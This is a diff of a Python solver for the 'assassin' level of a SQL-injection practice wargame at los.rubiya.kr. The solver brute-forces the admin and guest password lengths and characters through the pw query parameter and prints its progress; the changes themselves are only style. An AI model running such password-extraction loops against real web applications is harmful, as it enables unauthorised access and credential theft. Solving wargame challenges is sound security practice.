@@ -4,7 +4,7 @@ filter = '(single quote)
 
 import urllib.request
 import string
-from urllib.parse import quote # url encoding func
+from urllib.parse import quote  # url encoding func
 
 url = 'http://los.rubiya.kr/assassin_14a1fd552c61c60f034879e5d4171373.php?pw='
 guest_result = ""
@@ -15,6 +15,7 @@ find_check = False
 strings = string.digits + string.ascii_letters
 
 __author__ = "goodasd123@naver.com - h4lo"
+
 
 def req(query):
     re = urllib.request.Request(query)
@@ -37,7 +38,7 @@ for i in range(0, 10):
         break
     else:
         print("Matching.. -> [{}]".format('_' * i))
-if find_check != True:
+if not find_check:
     admin_pwlen = guest_pwlen
     print("[Admin password length is {}!]".format(admin_pwlen))
     find_check = False
@@ -62,7 +63,7 @@ for i in range(1, admin_pwlen + 1):
             print("[Admin] : {}%".format(admin_result))
         else:
             print("Matching.. -> [{}]".format(j))
-    if find_check != True:
+    if not find_check:
         admin_result = guest_result
         print("Admin = Guest")
         print("[Guest] : {}%".format(guest_result))
